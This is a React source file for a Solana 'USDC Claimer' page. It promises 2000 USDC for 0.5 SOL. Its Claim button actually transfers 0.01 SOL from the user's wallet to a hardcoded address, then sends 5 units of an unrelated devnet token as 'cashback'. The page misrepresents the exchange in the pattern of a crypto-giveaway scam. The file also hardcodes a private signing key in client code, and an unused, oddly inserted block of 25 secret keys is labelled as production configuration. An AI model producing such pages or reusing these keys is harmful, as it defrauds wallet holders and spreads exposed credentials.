/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "GbQiPBakDwgHchxMSqkViwxALe1nND8mQajdf5koLG6xssGa52u4pt4oTNAd196vChpEVzpD2XoDKpxaewgYprT"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3EuLSvFZeP59PH3VfiA9jg945mFdgJK2FS9wAxddHXn7jd9w9XfAU1JjFNRvGYp62qBsx2TKLZtBZKt7ka5g1w5v",
  "key1": "hZVBHZdhBxyBLiDkoECiKKvH7Zeyvo5YoFWuDf9nxZjEbwcWBESjg3iVtPrYn5bBwsyf1hFbyqVWQdzvTg9pVUS",
  "key2": "3awCFuCnp7WscSfcg2m76EEtzhfMSLfMo9Re8EjSoBtfDr15YppXGdjEVRH7Y8WKm1vyBbEHkocMFK2jn4yWTSCG",
  "key3": "2DMPh5pyaKjMUT5T6LCC7Kr3pDi53hB6yjwEZUYxTCk2Jbaedc12bVy7sKTxfC1WDjoJaHCG9hRqgUQo8LQeQvow",
  "key4": "2ozAbwAQGNDrb9iHQpipE7BVLhtws65mrtvVSJRCbgsjXb5s27A18DpJ2V44eouWYNMGWEaZCqKGRPXzcoAxjDJ6",
  "key5": "5QmWsgMxVAUrS8PzyHTJyJvDUasDaSuXpsswhUrUkv7qUv6B2cuvAVKC68X1jXN7eVWqjxsNUYJNvJBqf3LNmvUT",
  "key6": "4zT6RqZGBw1NHsY3aEtv9ApmJ3F6yPcGM8qbadeHJoWPy4bYPLDuXJ9ZqnD1CGgVVr54RUDQL7fMKtsRD6EV7EFn",
  "key7": "2J9xXGTFykEYFGpJVhCk3Y5gu5zrTLEaXNA3anvCRLW3jJDstypTy3k6Pzt1Pekkyic1m8gDucbzfNXgLYaCU1zX",
  "key8": "2Gudq324Ny4CKonkPKU12GMtBQGECRNUEtNAUgeh1VoeXpEsHUVGCGykibhjxUtVfxdh2WbJdDReyT4nNZVeMLXf",
  "key9": "WVqTWvstdDcg3GmNERS76or5K3szc5boq1ShXJ1nusxg7ar4vhZeQUGprUsoHxJTcitKWW2SMvNgDifEqZCJZjz",
  "key10": "52msEgdCiJzePj6QFNfrUj3QHPb598f5XvhqxiDryzqabf39cyN4RCawfo3sLapoSnjkRNkjfnj37hEi8nMEHZbr",
  "key11": "38wDUYYT8F21FUGhQSPHBHC4Q8idkbNH7LWFMHdmvX5J5SN1MY4K8AZN3eRR6MhrWvCtJfzYKbB9DBzxMYp1rKkW",
  "key12": "HhiQM3Zzv7YRkMYv2bWju7tgzjHq7nH5uJmxAvHjzgvP2WeyXXinu4tWontQmJ8st8VHgJyFKDaraBCu7Jdumho",
  "key13": "4Y6s8vQ5EHDhiiaoGApJaFka5RJiU9dzV68FjXWPyFNPLyUYe62qnVNexNR6XrvHRNZS1ba3HhbwS254217UAD5Q",
  "key14": "4WHnwhyFivifxYTaFAGJzCj9aJMDtQy6CFShxPjQRRBnhhd7Acb6N2pXKdRQBoo9yiQjzyUbL3yW82dS6C9EtgYn",
  "key15": "4eRCGJGcD6Dht7NmLaeC7ZtoZajWcdtxwLhHMKiC8k6sE7bvic577mF3pzGj2k5S861y7TkFxeDBntNSMtJtw4S2",
  "key16": "a7ZgtbbwsvoUnsg8zx4sfutYtxE2UEbP9PyVmwzCuc9PrsVxy7tTG9ZSQEbqp9rKKz1x9ha3JqVH5dwezpyDyKq",
  "key17": "4ZoCE4STZa4Yc5YLMxAZxSZ4W2XV72BRsMqExGLVZMfJ1koh8m2qEGGihbjaQsJ394vRsfVQ19kG1XY8cVkjCGPL",
  "key18": "NF8DBUcJZx2dw9SJPNKydds2MCPfqQvUn1JgxphVeFW1w7eAVn13mfu1hYZjyzVGJ3ZZfaRHrYixXB68qPSjr5e",
  "key19": "3NYJx3ZJfR8mu94aBLdqwjHPx9VE1ZDsZYAahfrxDdBFwidgVsA6NuXRcBdJBQyM3CueV2wUuDFoVLayDSA4fVV7",
  "key20": "2eUtAh6eUeXU5V5RFhhWuvjm2YutN51hGK464kW73LqA4n5LqCDGxStYxwypc5A6yjBeGV2LTjrUR8zTysgD4uSM",
  "key21": "tY2TKKVNWh87WxdAp8mMo7JPSKH2KEELVmmSGyLLsBqnQ1dTpykW3vELdoUrGVhUwB57K9AcHXueud3fMw8wHio",
  "key22": "51SD4YH8aSH1JLUUdAu3yPfSHWg9A3N98NP9PTcfJGuHGfgRfVbxjjpfGfPhMKRjN12kHtVj9jWjrRysEXezZfco",
  "key23": "4Sh3tMeaJ1763VTrGTF8NHkQor2iwQF57QDArZcsqsVJbu1ivXcCwoPoEg5JZu9gSQyxv5WxRpF3RCupSv5RfuyK",
  "key24": "uHDZrjdrrE18e5P5NUhyoiRXCrCzFjLfpJ1nQ85acUupV9VBSihV1MtFpQMrqgbmo8vzMfoM6HwTjKjZBYzmPHL"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
